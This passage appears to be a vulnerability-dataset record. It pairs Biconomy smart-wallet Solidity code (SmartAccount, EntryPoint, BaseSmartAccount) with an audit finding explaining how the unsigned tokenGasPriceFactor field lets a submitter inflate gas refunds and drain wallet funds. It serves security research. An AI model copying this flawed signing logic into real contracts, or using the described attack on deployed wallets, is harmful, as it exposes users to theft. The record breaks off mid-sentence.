_requireFromEntryPointOrOwner();\n        require(dest.length == func.length, \"wrong array lengths\");\n        for (uint i = 0; i < dest.length;) {\n            _call(dest[i], 0, func[i]);\n            unchecked {\n                ++i;\n            }\n        }\n    }\n\n    // AA implementation\n    function _call(address target, uint256 value, bytes memory data) internal {\n        (bool success, bytes memory result) = target.call{value : value}(data);\n        if (!success) {\n            assembly {\n                revert(add(result, 32), mload(result))\n            }\n        }\n    }\n    \n    //called by entryPoint, only after validateUserOp succeeded.\n    //@review\n    //Method is updated to instruct delegate call and emit regular events\n    function execFromEntryPoint(address dest, uint value, bytes calldata func, Enum.Operation operation, uint256 gasLimit) external onlyEntryPoint returns (bool success) {        \n        success = execute(dest, value, func, operation, gasLimit);\n        require(success, \"Userop Failed\");\n    }\n\n    function _requireFromEntryPointOrOwner() internal view {\n        require(msg.sender == address(entryPoint()) || msg.sender == owner, \"account: not Owner or EntryPoint\");\n    }\n\n    /// implement template method of BaseAccount\n    // @notice Nonce space is locked to 0 for AA transactions\n    // userOp could have batchId as well\n    function _validateAndUpdateNonce(UserOperation calldata userOp) internal override {\n        require(nonces[0]++ == userOp.nonce, \"account: invalid nonce\");\n    }\n\n    /// implement template method of BaseAccount\n    function _validateSignature(UserOperation calldata userOp, bytes32 userOpHash, address)\n    internal override virtual returns (uint256 deadline) {\n        bytes32 hash = userOpHash.toEthSignedMessageHash();\n        //ignore signature mismatch of from==ZERO_ADDRESS (for eth_callUserOp validation purposes)\n        // solhint-disable-next-line avoid-tx-origin\n        require(owner == hash.recover(userOp.signature) || tx.origin == address(0), \"account: wrong signature\");\n        return 0;\n    }\n\n    /**\n     * check current account deposit in the entryPoint\n     */\n    function getDeposit() public view returns (uint256) {\n        return entryPoint().balanceOf(address(this));\n    }\n\n    /**\n     * deposit more funds for this account in the entryPoint\n     */\n    function addDeposit() public payable {\n\n        (bool req,) = address(entryPoint()).call{value : msg.value}(\"\");\n        require(req);\n    }\n\n    /**\n     * withdraw value from the account's deposit\n     * @param withdrawAddress target to send to\n     * @param amount to withdraw\n     */\n    function withdrawDepositTo(address payable withdrawAddress, uint256 amount) public onlyOwner {\n        entryPoint().withdrawTo(withdrawAddress, amount);\n    }\n\n    /**\n     * @notice Query if a contract implements an interface\n     * @param interfaceId The interface identifier, as specified in ERC165\n     * @return `true` if the contract implements `_interfaceID`\n    */\n    function supportsInterface(bytes4 interfaceId) external view virtual override returns (bool) {\n        return interfaceId == type(IERC165).interfaceId; // 0x01ffc9a7\n    }\n\n    // solhint-disable-next-line no-empty-blocks\n    receive() external payable {}\n}\n\n/**\n ** Account-Abstraction (EIP-4337) singleton EntryPoint implementation.\n ** Only one instance required on each chain.\n **/\n// SPDX-License-Identifier: GPL-3.0\npragma solidity ^0.8.12;\n\n/* solhint-disable avoid-low-level-calls */\n/* solhint-disable no-inline-assembly */\n/* solhint-disable avoid-tx-origin */\n\nimport \"../interfaces/IAccount.sol\";\nimport \"../interfaces/IPaymaster.sol\";\n\nimport \"../interfaces/IAggregatedAccount.sol\";\nimport \"../interfaces/IEntryPoint.sol\";\nimport \"../utils/Exec.sol\";\nimport \"./StakeManager.sol\";\nimport \"./SenderCreator.sol\";\n\ncontract EntryPoint is IEntryPoint, StakeManager {\n\n    using UserOperationLib for UserOperation;\n\n    SenderCreator private immutable senderCreator = new SenderCreator();\n\n    // internal value used during simulation: need to query aggregator.\n    address private constant SIMULATE_FIND_AGGREGATOR = address(1);\n\n    /**\n     * compensate the caller's beneficiary address with the collected fees of all UserOperations.\n     * @param beneficiary the address to receive the fees\n     * @param amount amount to transfer.\n     */\n    function _compensate(address payable beneficiary, uint256 amount) internal {\n        require(beneficiary != address(0), \"AA90 invalid beneficiary\");\n        (bool success,) = beneficiary.call{value : amount}(\"\");\n        require(success, \"AA91 failed send to beneficiary\");\n    }\n\n    /**\n     * execute a user op\n     * @param opIndex into into the opInfo array\n     * @param userOp the userOp to execute\n     * @param opInfo the opInfo filled by validatePrepayment for this userOp.\n     * @return collected the total amount this userOp paid.\n     */\n    function _executeUserOp(uint256 opIndex, UserOperation calldata userOp, UserOpInfo memory opInfo) private returns (uint256 collected) {\n        uint256 preGas = gasleft();\n        bytes memory context = getMemoryBytesFromOffset(opInfo.contextOffset);\n\n        try this.innerHandleOp(userOp.callData, opInfo, context) returns (uint256 _actualGasCost) {\n            collected = _actualGasCost;\n        } catch {\n            uint256 actualGas = preGas - gasleft() + opInfo.preOpGas;\n            collected = _handlePostOp(opIndex, IPaymaster.PostOpMode.postOpReverted, opInfo, context, actualGas);\n        }\n    }\n\n    /**\n     * Execute a batch of UserOperation.\n     * no signature aggregator is used.\n     * if any account requires an aggregator (that is, it returned an \"actualAggregator\" when\n     * performing simulateValidation), then handleAggregatedOps() must be used instead.\n     * @param ops the operations to execute\n     * @param beneficiary the address to receive the fees\n     */\n    function handleOps(UserOperation[] calldata ops, address payable beneficiary) public {\n\n        uint256 opslen = ops.length;\n        UserOpInfo[] memory opInfos = new UserOpInfo[](opslen);\n\n    unchecked {\n        for (uint256 i = 0; i < opslen; i++) {\n            _validatePrepayment(i, ops[i], opInfos[i], address(0));\n        }\n\n        uint256 collected = 0;\n\n        for (uint256 i = 0; i < opslen; i++) {\n            collected += _executeUserOp(i, ops[i], opInfos[i]);\n        }\n\n        _compensate(beneficiary, collected);\n    } //unchecked\n    }\n\n    /**\n     * Execute a batch of UserOperation with Aggregators\n     * @param opsPerAggregator the operations to execute, grouped by aggregator (or address(0) for no-aggregator accounts)\n     * @param beneficiary the address to receive the fees\n     */\n    function handleAggregatedOps(\n        UserOpsPerAggregator[] calldata opsPerAggregator,\n        address payable beneficiary\n    ) public {\n\n        uint256 opasLen = opsPerAggregator.length;\n        uint256 totalOps = 0;\n        for (uint256 i = 0; i < opasLen; i++) {\n            totalOps += opsPerAggregator[i].userOps.length;\n        }\n\n        UserOpInfo[] memory opInfos = new UserOpInfo[](totalOps);\n\n        uint256 opIndex = 0;\n        for (uint256 a = 0; a < opasLen; a++) {\n            UserOpsPerAggregator calldata opa = opsPerAggregator[a];\n            UserOperation[] calldata ops = opa.userOps;\n            IAggregator aggregator = opa.aggregator;\n            uint256 opslen = ops.length;\n            for (uint256 i = 0; i < opslen; i++) {\n                _validatePrepayment(opIndex, ops[i], opInfos[opIndex], address(aggregator));\n                opIndex++;\n            }\n\n            if (address(aggregator) != address(0)) {\n                // solhint-disable-next-line no-empty-blocks\n                try aggregator.validateSignatures(ops, opa.signature) {}\n                catch {\n                    revert SignatureValidationFailed(address(aggregator));\n                }\n            }\n        }\n\n        uint256 collected = 0;\n        opIndex = 0;\n        for (uint256 a = 0; a < opasLen; a++) {\n            UserOpsPerAggregator calldata opa = opsPerAggregator[a];\n            emit SignatureAggregatorChanged(address(opa.aggregator));\n            UserOperation[] calldata ops = opa.userOps;\n            uint256 opslen = ops.length;\n\n            for (uint256 i = 0; i < opslen; i++) {\n                collected += _executeUserOp(opIndex, ops[i], opInfos[opIndex]);\n                opIndex++;\n            }\n        }\n        emit SignatureAggregatorChanged(address(0));\n\n        _compensate(beneficiary, collected);\n    }\n\n    //a memory copy of UserOp fields (except that dynamic byte arrays: callData, initCode and signature\n    struct MemoryUserOp {\n        address sender;\n        uint256 nonce;\n        uint256 callGasLimit;\n        uint256 verificationGasLimit;\n        uint256 preVerificationGas;\n        address paymaster;\n        uint256 maxFeePerGas;\n        uint256 maxPriorityFeePerGas;\n    }\n\n    struct UserOpInfo {\n        MemoryUserOp mUserOp;\n        bytes32 userOpHash;\n        uint256 prefund;\n        uint256 contextOffset;\n        uint256 preOpGas;\n    }\n\n    /**\n     * inner function to handle a UserOperation.\n     * Must be declared \"external\" to open a call context, but it can only be called by handleOps.\n     */\n    function innerHandleOp(bytes calldata callData, UserOpInfo memory opInfo, bytes calldata context) external returns (uint256 actualGasCost) {\n        uint256 preGas = gasleft();\n        require(msg.sender == address(this), \"AA92 internal call only\");\n        MemoryUserOp memory mUserOp = opInfo.mUserOp;\n\n        IPaymaster.PostOpMode mode = IPaymaster.PostOpMode.opSucceeded;\n        if (callData.length > 0) {\n\n            (bool success,bytes memory result) = address(mUserOp.sender).call{gas : mUserOp.callGasLimit}(callData);\n            if (!success) {\n                if (result.length > 0) {\n                    emit UserOperationRevertReason(opInfo.userOpHash, mUserOp.sender, mUserOp.nonce, result);\n                }\n                mode = IPaymaster.PostOpMode.opReverted;\n            }\n        }\n\n    unchecked {\n        uint256 actualGas = preGas - gasleft() + opInfo.preOpGas;\n        //note: opIndex is ignored (relevant only if mode==postOpReverted, which is only possible outside of innerHandleOp)\n        return _handlePostOp(0, mode, opInfo, context, actualGas);\n    }\n    }\n\n    /**\n     * generate a request Id - unique identifier for this request.\n     * the request ID is a hash over the content of the userOp (except the signature), the entrypoint and the chainid.\n     */\n    function getUserOpHash(UserOperation calldata userOp) public view returns (bytes32) {\n        return keccak256(abi.encode(userOp.hash(), address(this), block.chainid));\n    }\n\n    /**\n     * copy general fields from userOp into the memory opInfo structure.\n     */\n    function _copyUserOpToMemory(UserOperation calldata userOp, MemoryUserOp memory mUserOp) internal pure {\n        mUserOp.sender = userOp.sender;\n        mUserOp.nonce = userOp.nonce;\n        mUserOp.callGasLimit = userOp.callGasLimit;\n        mUserOp.verificationGasLimit = userOp.verificationGasLimit;\n        mUserOp.preVerificationGas = userOp.preVerificationGas;\n        mUserOp.maxFeePerGas = userOp.maxFeePerGas;\n        mUserOp.maxPriorityFeePerGas = userOp.maxPriorityFeePerGas;\n        bytes calldata paymasterAndData = userOp.paymasterAndData;\n        if (paymasterAndData.length > 0) {\n            require(paymasterAndData.length >= 20, \"AA93 invalid paymasterAndData\");\n            mUserOp.paymaster = address(bytes20(paymasterAndData[: 20]));\n        } else {\n            mUserOp.paymaster = address(0);\n        }\n    }\n\n    /**\n     * Simulate a call to account.validateUserOp and paymaster.validatePaymasterUserOp.\n     * @dev this method always revert. Successful result is SimulationResult error. other errors are failures.\n     * @dev The node must also verify it doesn't use banned opcodes, and that it doesn't reference storage outside the account's data.\n     * @param userOp the user operation to validate.\n     */\n    function simulateValidation(UserOperation calldata userOp) external {\n        uint256 preGas = gasleft();\n\n        UserOpInfo memory outOpInfo;\n\n        (address aggregator, uint256 deadline) = _validatePrepayment(0, userOp, outOpInfo, SIMULATE_FIND_AGGREGATOR);\n        uint256 prefund = outOpInfo.prefund;\n        uint256 preOpGas = preGas - gasleft() + userOp.preVerificationGas;\n        StakeInfo memory paymasterInfo = getStakeInfo(outOpInfo.mUserOp.paymaster);\n        StakeInfo memory senderInfo = getStakeInfo(outOpInfo.mUserOp.sender);\n        bytes calldata initCode = userOp.initCode;\n        address factory = initCode.length >= 20 ? address(bytes20(initCode[0 : 20])) : address(0);\n        StakeInfo memory factoryInfo = getStakeInfo(factory);\n\n        if (aggregator != address(0)) {\n            AggregatorStakeInfo memory aggregatorInfo = AggregatorStakeInfo(aggregator, getStakeInfo(aggregator));\n            revert SimulationResultWithAggregation(preOpGas, prefund, deadline, senderInfo, factoryInfo, paymasterInfo, aggregatorInfo);\n        }\n        revert SimulationResult(preOpGas, prefund, deadline, senderInfo, factoryInfo, paymasterInfo);\n\n    }\n\n    function _getRequiredPrefund(MemoryUserOp memory mUserOp) internal view returns (uint256 requiredPrefund) {\n    unchecked {\n        //when using a Paymaster, the verificationGasLimit is used also to as a limit for the postOp call.\n        // our security model might call postOp eventually twice\n        uint256 mul = mUserOp.paymaster != address(0) ? 3 : 1;\n        uint256 requiredGas = mUserOp.callGasLimit + mUserOp.verificationGasLimit * mul + mUserOp.preVerificationGas;\n\n        // TODO: copy logic of gasPrice?\n        requiredPrefund = requiredGas * getUserOpGasPrice(mUserOp);\n    }\n    }\n\n    // create the sender's contract if needed.\n    function _createSenderIfNeeded(uint256 opIndex, UserOpInfo memory opInfo, bytes calldata initCode) internal {\n        if (initCode.length != 0) {\n            address sender = opInfo.mUserOp.sender;\n            if (sender.code.length != 0) revert FailedOp(opIndex, address(0), \"AA10 sender already constructed\");\n            address sender1 = senderCreator.createSender{gas : opInfo.mUserOp.verificationGasLimit}(initCode);\n            if (sender1 == address(0)) revert FailedOp(opIndex, address(0), \"AA13 initCode failed or OOG\");\n            if (sender1 != sender) revert FailedOp(opIndex, address(0), \"AA14 initCode must return sender\");\n            if (sender1.code.length == 0) revert FailedOp(opIndex, address(0), \"AA15 initCode must create sender\");\n            address factory = address(bytes20(initCode[0 : 20]));\n            emit AccountDeployed(opInfo.userOpHash, sender, factory, opInfo.mUserOp.paymaster);\n        }\n    }\n\n    /**\n     * Get counterfactual sender address.\n     *  Calculate the sender contract address that will be generated by the initCode and salt in the UserOperation.\n     * this method always revert, and returns the address in SenderAddressResult error\n     * @param initCode the constructor code to be passed into the UserOperation.\n     */\n    function getSenderAddress(bytes calldata initCode) public {\n        revert SenderAddressResult(senderCreator.createSender(initCode));\n    }\n\n    /**\n     * call account.validateUserOp.\n     * revert (with FailedOp) in case validateUserOp reverts, or account didn't send required prefund.\n     * decrement account's deposit if needed\n     */\n    function _validateAccountPrepayment(uint256 opIndex, UserOperation calldata op, UserOpInfo memory opInfo, address aggregator, uint256 requiredPrefund)\n    internal returns (uint256 gasUsedByValidateAccountPrepayment, address actualAggregator, uint256 deadline) {\n    unchecked {\n        uint256 preGas = gasleft();\n        MemoryUserOp memory mUserOp = opInfo.mUserOp;\n        address sender = mUserOp.sender;\n        _createSenderIfNeeded(opIndex, opInfo, op.initCode);\n        if (aggregator == SIMULATE_FIND_AGGREGATOR) {\n            numberMarker();\n\n            if (sender.code.length == 0) {\n                // it would revert anyway. but give a meaningful message\n                revert FailedOp(0, address(0), \"AA20 account not deployed\");\n            }\n            if (mUserOp.paymaster != address(0) && mUserOp.paymaster.code.length == 0) {\n                // it would revert anyway. but give a meaningful message\n                revert FailedOp(0, address(0), \"AA30 paymaster not deployed\");\n            }\n            try IAggregatedAccount(sender).getAggregator() returns (address userOpAggregator) {\n                aggregator = actualAggregator = userOpAggregator;\n            } catch {\n                aggregator = actualAggregator = address(0);\n            }\n        }\n        uint256 missingAccountFunds = 0;\n        address paymaster = mUserOp.paymaster;\n        if (paymaster == address(0)) {\n            uint256 bal = balanceOf(sender);\n            missingAccountFunds = bal > requiredPrefund ? 0 : requiredPrefund - bal;\n        }\n        try IAccount(sender).validateUserOp{gas : mUserOp.verificationGasLimit}(op, opInfo.userOpHash, aggregator, missingAccountFunds) returns (uint256 _deadline) {\n            // solhint-disable-next-line not-rely-on-time\n            if (_deadline != 0 && _deadline < block.timestamp) {\n                revert FailedOp(opIndex, address(0), \"AA22 expired\");\n            }\n            deadline = _deadline;\n        } catch Error(string memory revertReason) {\n            revert FailedOp(opIndex, address(0), revertReason);\n        } catch {\n            revert FailedOp(opIndex, address(0), \"AA23 reverted (or OOG)\");\n        }\n        if (paymaster == address(0)) {\n            DepositInfo storage senderInfo = deposits[sender];\n            uint256 deposit = senderInfo.deposit;\n            if (requiredPrefund > deposit) {\n                revert FailedOp(opIndex, address(0), \"AA21 didn't pay prefund\");\n            }\n            senderInfo.deposit = uint112(deposit - requiredPrefund);\n        }\n        gasUsedByValidateAccountPrepayment = preGas - gasleft();\n    }\n    }\n\n    /**\n     * in case the request has a paymaster:\n     * validate paymaster is staked and has enough deposit.\n     * call paymaster.validatePaymasterUserOp.\n     * revert with proper FailedOp in case paymaster reverts.\n     * decrement paymaster's deposit\n     */\n    function _validatePaymasterPrepayment(uint256 opIndex, UserOperation calldata op, UserOpInfo memory opInfo, uint256 requiredPreFund, uint256 gasUsedByValidateAccountPrepayment) internal returns (bytes memory context, uint256 deadline) {\n    unchecked {\n        MemoryUserOp memory mUserOp = opInfo.mUserOp;\n        uint256 verificationGasLimit = mUserOp.verificationGasLimit;\n        require(verificationGasLimit > gasUsedByValidateAccountPrepayment, \"AA41 too little verificationGas\");\n        uint256 gas = verificationGasLimit - gasUsedByValidateAccountPrepayment;\n\n        address paymaster = mUserOp.paymaster;\n        DepositInfo storage paymasterInfo = deposits[paymaster];\n        uint256 deposit = paymasterInfo.deposit;\n        if (deposit < requiredPreFund) {\n            revert FailedOp(opIndex, paymaster, \"AA31 paymaster deposit too low\");\n        }\n        paymasterInfo.deposit = uint112(deposit - requiredPreFund);\n        try IPaymaster(paymaster).validatePaymasterUserOp{gas : gas}(op, opInfo.userOpHash, requiredPreFund) returns (bytes memory _context, uint256 _deadline){\n            // solhint-disable-next-line not-rely-on-time\n            if (_deadline != 0 && _deadline < block.timestamp) {\n                revert FailedOp(opIndex, paymaster, \"AA32 paymaster expired\");\n            }\n            context = _context;\n            deadline = _deadline;\n        } catch Error(string memory revertReason) {\n            revert FailedOp(opIndex, paymaster, revertReason);\n        } catch {\n            revert FailedOp(opIndex, paymaster, \"AA33 reverted (or OOG)\");\n        }\n    }\n    }\n\n    /**\n     * validate account and paymaster (if defined).\n     * also make sure total validation doesn't exceed verificationGasLimit\n     * this method is called off-chain (simulateValidation()) and on-chain (from handleOps)\n     * @param opIndex the index of this userOp into the \"opInfos\" array\n     * @param userOp the userOp to validate\n     */\n    function _validatePrepayment(uint256 opIndex, UserOperation calldata userOp, UserOpInfo memory outOpInfo, address aggregator)\n    private returns (address actualAggregator, uint256 deadline) {\n\n        uint256 preGas = gasleft();\n        MemoryUserOp memory mUserOp = outOpInfo.mUserOp;\n        _copyUserOpToMemory(userOp, mUserOp);\n        outOpInfo.userOpHash = getUserOpHash(userOp);\n\n        // validate all numeric values in userOp are well below 128 bit, so they can safely be added\n        // and multiplied without causing overflow\n        uint256 maxGasValues = mUserOp.preVerificationGas | mUserOp.verificationGasLimit | mUserOp.callGasLimit |\n        userOp.maxFeePerGas | userOp.maxPriorityFeePerGas;\n        require(maxGasValues <= type(uint120).max, \"AA94 gas values overflow\");\n\n        uint256 gasUsedByValidateAccountPrepayment;\n        (uint256 requiredPreFund) = _getRequiredPrefund(mUserOp);\n        (gasUsedByValidateAccountPrepayment, actualAggregator, deadline) = _validateAccountPrepayment(opIndex, userOp, outOpInfo, aggregator, requiredPreFund);\n        //a \"marker\" where account opcode validation is done and paymaster opcode validation is about to start\n        // (used only by off-chain simulateValidation)\n        numberMarker();\n\n        bytes memory context;\n        if (mUserOp.paymaster != address(0)) {\n            uint paymasterDeadline;\n            (context, paymasterDeadline) = _validatePaymasterPrepayment(opIndex, userOp, outOpInfo, requiredPreFund, gasUsedByValidateAccountPrepayment);\n            if (paymasterDeadline != 0 && paymasterDeadline < deadline) {\n                deadline = paymasterDeadline;\n            }\n        } else {\n            context = \"\";\n\n        }\n    unchecked {\n        uint256 gasUsed = preGas - gasleft();\n\n        if (userOp.verificationGasLimit < gasUsed) {\n            revert FailedOp(opIndex, mUserOp.paymaster, \"AA40 over verificationGasLimit\");\n        }\n        outOpInfo.prefund = requiredPreFund;\n        outOpInfo.contextOffset = getOffsetOfMemoryBytes(context);\n        outOpInfo.preOpGas = preGas - gasleft() + userOp.preVerificationGas;\n    }\n    }\n\n    /**\n     * process post-operation.\n     * called just after the callData is executed.\n     * if a paymaster is defined and its validation returned a non-empty context, its postOp is called.\n     * the excess amount is refunded to the account (or paymaster - if it is was used in the request)\n     * @param opIndex index in the batch\n     * @param mode - whether is called from innerHandleOp, or outside (postOpReverted)\n     * @param opInfo userOp fields and info collected during validation\n     * @param context the context returned in validatePaymasterUserOp\n     * @param actualGas the gas used so far by this user operation\n     */\n    function _handlePostOp(uint256 opIndex, IPaymaster.PostOpMode mode, UserOpInfo memory opInfo, bytes memory context, uint256 actualGas) private returns (uint256 actualGasCost) {\n        uint256 preGas = gasleft();\n    unchecked {\n        address refundAddress;\n        MemoryUserOp memory mUserOp = opInfo.mUserOp;\n        uint256 gasPrice = getUserOpGasPrice(mUserOp);\n\n        address paymaster = mUserOp.paymaster;\n        if (paymaster == address(0)) {\n            refundAddress = mUserOp.sender;\n        } else {\n            refundAddress = paymaster;\n            if (context.length > 0) {\n                actualGasCost = actualGas * gasPrice;\n                if (mode != IPaymaster.PostOpMode.postOpReverted) {\n                    IPaymaster(paymaster).postOp{gas : mUserOp.verificationGasLimit}(mode, context, actualGasCost);\n                } else {\n                    // solhint-disable-next-line no-empty-blocks\n                    try IPaymaster(paymaster).postOp{gas : mUserOp.verificationGasLimit}(mode, context, actualGasCost) {}\n                    catch Error(string memory reason) {\n                        revert FailedOp(opIndex, paymaster, reason);\n                    }\n                    catch {\n                        revert FailedOp(opIndex, paymaster, \"A50 postOp revert\");\n                    }\n                }\n            }\n        }\n        actualGas += preGas - gasleft();\n        actualGasCost = actualGas * gasPrice;\n        if (opInfo.prefund < actualGasCost) {\n            revert FailedOp(opIndex, paymaster, \"A51 prefund below actualGasCost\");\n        }\n        uint256 refund = opInfo.prefund - actualGasCost;\n        internalIncrementDeposit(refundAddress, refund);\n        bool success = mode == IPaymaster.PostOpMode.opSucceeded;\n        emit UserOperationEvent(opInfo.userOpHash, mUserOp.sender, mUserOp.paymaster, mUserOp.nonce, success, actualGasCost, actualGas);\n    } // unchecked\n    }\n\n    /**\n     * the gas price this UserOp agrees to pay.\n     * relayer/block builder might submit the TX with higher priorityFee, but the user should not\n     */\n    function getUserOpGasPrice(MemoryUserOp memory mUserOp) internal view returns (uint256) {\n    unchecked {\n        uint256 maxFeePerGas = mUserOp.maxFeePerGas;\n        uint256 maxPriorityFeePerGas = mUserOp.maxPriorityFeePerGas;\n        if (maxFeePerGas == maxPriorityFeePerGas) {\n            //legacy mode (for networks that don't support basefee opcode)\n            return maxFeePerGas;\n        }\n        return min(maxFeePerGas, maxPriorityFeePerGas + block.basefee);\n    }\n    }\n\n    function min(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a < b ? a : b;\n    }\n\n    function getOffsetOfMemoryBytes(bytes memory data) internal pure returns (uint256 offset) {\n        assembly {offset := data}\n    }\n\n    function getMemoryBytesFromOffset(uint256 offset) internal pure returns (bytes memory data) {\n        assembly {data := offset}\n    }\n\n    //place the NUMBER opcode in the code.\n    // this is used as a marker during simulation, as this OP is completely banned from the simulated code of the\n    // account and paymaster.\n    function numberMarker() internal view {\n        assembly {mstore(0, number())}\n    }\n}\n\n// SPDX-License-Identifier: GPL-3.0\npragma solidity 0.8.12;\n\n/* solhint-disable avoid-low-level-calls */\n/* solhint-disable no-inline-assembly */\n/* solhint-disable reason-string */\n\nimport \"@account-abstraction/contracts/interfaces/IAccount.sol\";\nimport \"@account-abstraction/contracts/interfaces/IEntryPoint.sol\";\nimport \"./common/Enum.sol\";\n\nstruct Transaction {\n        address to;\n        uint256 value;\n        bytes data;\n        Enum.Operation operation;\n        uint256 targetTxGas;\n    }\n\nstruct FeeRefund {\n        uint256 baseGas;\n        uint256 gasPrice; //gasPrice or tokenGasPrice\n        uint256 tokenGasPriceFactor;\n        address gasToken;\n        address payable refundReceiver;\n    }\n\n/**\n * Basic account implementation.\n * this contract provides the basic logic for implementing the IAccount interface  - validateUserOp\n * specific account implementation should inherit it and provide the account-specific logic\n */\nabstract contract BaseSmartAccount is IAccount {\n    using UserOperationLib for UserOperation;\n\n\n    /**\n     * return the account nonce.\n     * subclass should return a nonce value that is used both by _validateAndUpdateNonce, and by the external provider (to read the current nonce)\n     */\n    function nonce() public view virtual returns (uint256);\n\n     /**\n     * return the account nonce.\n     * subclass should return a nonce value that is used both by _validateAndUpdateNonce, and by the external provider (to read the current nonce)\n     */\n    function nonce(uint256 _batchId) public view virtual returns (uint256);\n\n    /**\n     * return the entryPoint used by this account.\n     * subclass should return the current entryPoint used by this account.\n     */\n    function entryPoint() public view virtual returns (IEntryPoint);\n\n    /**\n     * Validate user's signature and nonce.\n     * subclass doesn't need to override this method. Instead, it should override the specific internal validation methods.\n     */\n    // review virtual \n    function validateUserOp(UserOperation calldata userOp, bytes32 userOpHash, address aggregator, uint256 missingAccountFunds)\n    external override virtual returns (uint256 deadline) {\n        _requireFromEntryPoint();\n        deadline = _validateSignature(userOp, userOpHash, aggregator);\n        if (userOp.initCode.length == 0) {\n            _validateAndUpdateNonce(userOp);\n        }\n        _payPrefund(missingAccountFunds);\n    }\n\n    /**\n     * ensure the request comes from the known entrypoint.\n     */\n    function _requireFromEntryPoint() internal virtual view {\n        require(msg.sender == address(entryPoint()), \"account: not from EntryPoint\");\n    }\n\n    /**\n     * validate the signature is valid for this message.\n     * @param userOp validate the userOp.signature field\n     * @param userOpHash convenient field: the hash of the request, to check the signature against\n     *          (also hashes the entrypoint and chain-id)\n     * @param aggregator the current aggregator. can be ignored by accounts that don't use aggregators\n     * @return deadline the last block timestamp this operation is valid, or zero if it is valid indefinitely.\n     *      Note that the validation code cannot use block.timestamp (or block.number) directly.\n     */\n    // Review if we need to make view function\n    function _validateSignature(UserOperation calldata userOp, bytes32 userOpHash, address aggregator)\n    internal virtual returns (uint256 deadline);\n\n    /**\n     * validate the current nonce matches the UserOperation nonce.\n     * then it should update the account's state to prevent replay of this UserOperation.\n     * called only if initCode is empty (since \"nonce\" field is used as \"salt\" on account creation)\n     * @param userOp the op to validate.\n     */\n    function _validateAndUpdateNonce(UserOperation calldata userOp) internal virtual;\n\n    /**\n     * sends to the entrypoint (msg.sender) the missing funds for this transaction.\n     * subclass MAY override this method for better funds management\n     * (e.g. send to the entryPoint more than the minimum required, so that in future transactions\n     * it will not be required to send again)\n     * @param missingAccountFunds the minimum value this method should send the entrypoint.\n     *  this value MAY be zero, in case there is enough deposit, or the userOp has a paymaster.\n     */\n    function _payPrefund(uint256 missingAccountFunds) internal virtual {\n        if (missingAccountFunds != 0) {\n            (bool success,) = payable(msg.sender).call{value : missingAccountFunds, gas : type(uint256).max}(\"\");\n            (success);\n            //ignore failure (its EntryPoint's job to verify, not account.)\n        }\n    }\n    \n    function init(address _owner, address _entryPointAddress, address _handler) external virtual;\n\n    function execTransaction(\n        Transaction memory _tx,\n        uint256 batchId,\n        FeeRefund memory refundInfo,\n        bytes memory signatures) public payable virtual returns (bool success);\n}\n\n",
        "CodeNames": [
            "SmartAccount.sol",
            "EntryPoint.sol",
            "BaseSmartAccount.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-06",
                "Location": [
                    "sol\n    function encodeTransactionData(\n        Transaction memory _tx,\n        FeeRefund memory refundInfo,\n        uint256 _nonce\n    ) public view returns (bytes memory) {\n        bytes32 safeTxHash =\n            keccak256(\n                abi.encode(\n                    ACCOUNT_TX_TYPEHASH,\n                    _tx.to,\n                    _tx.value,\n                    keccak256(_tx.data),\n                    _tx.operation,\n                    _tx.targetTxGas,\n                    refundInfo.baseGas,\n                    refundInfo.gasPrice,\n                    refundInfo.gasToken,\n                    refundInfo.refundReceiver,\n                    _nonce\n                )\n            );\n        return abi.encodePacked(bytes1(0x19), bytes1(0x01), domainSeparator(), safeTxHash);\n    }\n",
                    "sol\n    function handlePayment(\n        uint256 gasUsed,\n        uint256 baseGas,\n        uint256 gasPrice,\n        uint256 tokenGasPriceFactor,\n        address gasToken,\n        address payable refundReceiver\n    ) private nonReentrant returns (uint256 payment) {\n        // uint256 startGas = gasleft();\n        // solhint-disable-next-line avoid-tx-origin\n        address payable receiver = refundReceiver == address(0) ? payable(tx.origin) : refundReceiver;\n        if (gasToken == address(0)) {\n            // For ETH we will only adjust the gas price to not be higher than the actual used gas price\n            payment = (gasUsed + baseGas) * (gasPrice < tx.gasprice ? gasPrice : tx.gasprice);\n            (bool success,) = receiver.call{value: payment}(\"\");\n            require(success, \"BSA011\");\n        } else {\n            payment = (gasUsed + baseGas) * (gasPrice) / (tokenGasPriceFactor);\n            require(transferToken(gasToken, receiver, payment), \"BSA012\");\n        }\n        // uint256 requiredGas = startGas gasleft();\n        //console.log(\"hp %s\", requiredGas);\n    }\n",
                    "sol\n            if (refundInfo.gasPrice  0) {\n                //console.log(\"sent %s\", startGas gasleft());\n                // extraGas = gasleft();\n                payment = handlePayment(startGas gasleft(), refundInfo.baseGas, refundInfo.gasPrice, refundInfo.tokenGasPriceFactor, refundInfo.gasToken, refundInfo.refundReceiver);\n                emit WalletHandlePayment(txHash, payment);\n            }\n"
                ],
                "Type": "  FeeRefund.tokenGasPriceFactor  is not included in signed transaction data allowing the submitter to steal funds",
                "Description": "*Submitted by Ruhum(https://github.com/code-423n4/2023-01-biconomy-findings/issues/123), also found by V_B(https://github.com/code-423n4/2023-01-biconomy-findings/issues/492), adriro(https://github.com/code-423n4/2023-01-biconomy-findings/issues/447), immeas(https://github.com/code-423n4/2023-01-biconomy-findings/issues/414), supernova(https://github.com/code-423n4/2023-01-biconomy-findings/issues/300), MalfurionWhitehat(https://github.com/code-423n4/2023-01-biconomy-findings/issues/211), cccz(https://github.com/code-423n4/2023-01-biconomy-findings/issues/193), and ladboy233(https://github.com/code-423n4/2023-01-biconomy-findings/issues/165)*\n\ncontracts/smart-contract-wallet/SmartAccount.sol#L288(https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L288)<br\ncontracts/smart-contract-wallet/SmartAccount.sol#L429-L444(https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L429-L444)\n\nThe submitter of a transaction is paid back the transaction's gas costs either in ETH or in ERC20 tokens. With ERC20 tokens the following formula is used: $(gasUsed + baseGas) * gasPrice / tokenGasPriceFactor$. baseGas, gasPrice, and tokenGasPriceFactor are values specified by the tx submitter. Since you don't want the submitter to choose arbitrary values and pay themselves as much as they want, those values are supposed to be signed off by the owner of the wallet. The signature of the user is included in the tx so that the contract can verify that all the values are correct. But, the tokenGasPriceFactor value is not included in those checks. Thus, the submitter is able to simulate the tx with value $x$, get the user to sign that tx, and then submit it with $y$ for tokenGasPriceFactor. That way they can increase the actual gas repayment and steal the user's funds.\n\n\nIn encodeTransactionData() we can see that 